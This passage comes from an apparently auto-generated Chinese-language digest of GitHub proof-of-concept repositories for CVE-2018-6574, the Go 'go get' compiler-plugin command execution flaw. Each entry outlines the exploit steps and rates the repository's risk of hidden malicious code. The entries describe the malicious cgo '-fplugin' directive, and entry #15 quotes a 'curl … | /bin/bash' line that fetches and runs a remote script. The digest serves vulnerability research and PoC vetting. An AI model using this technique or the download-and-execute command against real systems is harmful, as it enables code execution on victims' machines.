**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

